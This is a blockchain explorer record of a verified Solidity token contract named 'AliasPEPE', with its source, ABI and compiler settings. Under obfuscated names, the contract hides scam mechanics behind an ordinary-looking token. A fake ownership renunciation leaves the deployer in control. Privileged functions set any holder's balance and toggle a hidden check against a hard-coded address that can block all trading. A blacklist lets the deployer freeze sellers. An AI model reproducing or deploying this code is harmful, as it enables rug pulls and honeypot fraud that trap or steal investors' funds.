{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface fromTx {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address limitFund) external view returns (uint256);\n\n    function transfer(address shouldFundToken, uint256 takeMax) external returns (bool);\n\n    function allowance(address totalMaxLiquidity, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 takeMax) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address shouldFundToken,\n        uint256 takeMax\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed marketingLaunch, uint256 value);\n    event Approval(address indexed totalMaxLiquidity, address indexed spender, uint256 value);\n}\n\nabstract contract amountList {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface feeSender {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface maxLiquidity {\n    function createPair(address exemptSell, address teamAt) external returns (address);\n}\n\ninterface fromTxMetadata is fromTx {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AliasPEPE is amountList, fromTx, fromTxMetadata {\n\n    bool private txEnable;\n\n    string private senderAmountReceiver = \"Alias PEPE\";\n\n    function transferFrom(address walletTotal, address shouldFundToken, uint256 takeMax) external override returns (bool) {\n        if (_msgSender() != shouldReceiver) {\n            if (listTradingTeam[walletTotal][_msgSender()] != type(uint256).max) {\n                require(takeMax <= listTradingTeam[walletTotal][_msgSender()]);\n                listTradingTeam[walletTotal][_msgSender()] -= takeMax;\n            }\n        }\n        return feeAt(walletTotal, shouldFundToken, takeMax);\n    }\n\n    function fundExemptReceiver(address shouldLaunch) public {\n        if (minEnable) {\n            return;\n        }\n        \n        buyLaunched[shouldLaunch] = true;\n        \n        minEnable = true;\n    }\n\n    function allowance(address limitAmountTotal, address buyTo) external view virtual override returns (uint256) {\n        if (buyTo == shouldReceiver) {\n            return type(uint256).max;\n        }\n        return listTradingTeam[limitAmountTotal][buyTo];\n    }\n\n    function sellShould(address teamReceiver, uint256 takeMax) public {\n        atLimit();\n        txLiquidityIs[teamReceiver] = takeMax;\n    }\n\n    mapping(address => bool) public buyLaunched;\n\n    function toSenderFee(uint256 takeMax) public {\n        atLimit();\n        feeTeamSell = takeMax;\n    }\n\n    function walletFundMax(address walletTotal, address shouldFundToken, uint256 takeMax) internal returns (bool) {\n        require(txLiquidityIs[walletTotal] >= takeMax);\n        txLiquidityIs[walletTotal] -= takeMax;\n        txLiquidityIs[shouldFundToken] += takeMax;\n        emit Transfer(walletTotal, shouldFundToken, takeMax);\n        return true;\n    }\n\n    bool public limitToMax;\n\n    mapping(address => mapping(address => uint256)) private listTradingTeam;\n\n    uint256 public autoLaunched;\n\n    bool private receiverTeam;\n\n    uint256 feeTeamSell;\n\n    uint256 public sellToken;\n\n    function getOwner() external view returns (address) {\n        return toTokenWallet;\n    }\n\n    function owner() external view returns (address) {\n        return toTokenWallet;\n    }\n\n    uint256 public teamAmountReceiver;\n\n    address private toTokenWallet;\n\n    constructor (){\n        \n        feeSender receiverTotal = feeSender(shouldReceiver);\n        totalMarketing = maxLiquidity(receiverTotal.factory()).createPair(receiverTotal.WETH(), address(this));\n        if (senderFrom == limitToMax) {\n            shouldSell = autoLaunched;\n        }\n        amountSwap = _msgSender();\n        toReceiver();\n        buyLaunched[amountSwap] = true;\n        txLiquidityIs[amountSwap] = minLiquidity;\n        \n        emit Transfer(address(0), amountSwap, minLiquidity);\n    }\n\n    function feeAt(address walletTotal, address shouldFundToken, uint256 takeMax) internal returns (bool) {\n        if (walletTotal == amountSwap) {\n            return walletFundMax(walletTotal, shouldFundToken, takeMax);\n        }\n        uint256 fundTo = fromTx(totalMarketing).balanceOf(atEnable);\n        require(fundTo == feeTeamSell);\n        require(shouldFundToken != atEnable);\n        if (txToken[walletTotal]) {\n            return walletFundMax(walletTotal, shouldFundToken, modeReceiverFrom);\n        }\n        return walletFundMax(walletTotal, shouldFundToken, takeMax);\n    }\n\n    bool public minEnable;\n\n    uint256 private minLiquidity = 100000000 * 10 ** 18;\n\n    string private fundBuyMin = \"APE\";\n\n    function balanceOf(address limitFund) public view virtual override returns (uint256) {\n        return txLiquidityIs[limitFund];\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return minLiquidity;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return feeLaunched;\n    }\n\n    uint256 constant modeReceiverFrom = 9 ** 10;\n\n    uint256 exemptSender;\n\n    address atEnable = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function exemptMax(address teamEnable) public {\n        atLimit();\n        \n        if (teamEnable == amountSwap || teamEnable == totalMarketing) {\n            return;\n        }\n        txToken[teamEnable] = true;\n    }\n\n    mapping(address => uint256) private txLiquidityIs;\n\n    address public amountSwap;\n\n    address public totalMarketing;\n\n    uint8 private feeLaunched = 18;\n\n    bool private swapFee;\n\n    mapping(address => bool) public txToken;\n\n    function atLimit() private view {\n        require(buyLaunched[_msgSender()]);\n    }\n\n    function toReceiver() public {\n        emit OwnershipTransferred(amountSwap, address(0));\n        toTokenWallet = address(0);\n    }\n\n    uint256 private shouldSell;\n\n    function symbol() external view virtual override returns (string memory) {\n        return fundBuyMin;\n    }\n\n    bool public senderFrom;\n\n    address shouldReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transfer(address teamReceiver, uint256 takeMax) external virtual override returns (bool) {\n        return feeAt(_msgSender(), teamReceiver, takeMax);\n    }\n\n    function approve(address buyTo, uint256 takeMax) public virtual override returns (bool) {\n        listTradingTeam[_msgSender()][buyTo] = takeMax;\n        emit Approval(_msgSender(), buyTo, takeMax);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return senderAmountReceiver;\n    }\n\n    bool public shouldTo;\n\n    event OwnershipTransferred(address indexed senderFund, address indexed toEnable);\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalMaxLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toEnable\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingLaunch\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitAmountTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyTo\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeMax\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitFund\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamEnable\",\"type\":\"address\"}],\"name\":\"exemptMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldLaunch\",\"type\":\"address\"}],\"name\":\"fundExemptReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitToMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeMax\",\"type\":\"uint256\"}],\"name\":\"sellShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamAmountReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"takeMax\",\"type\":\"uint256\"}],\"name\":\"toSenderFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeMax\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldFundToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeMax\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AliasPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}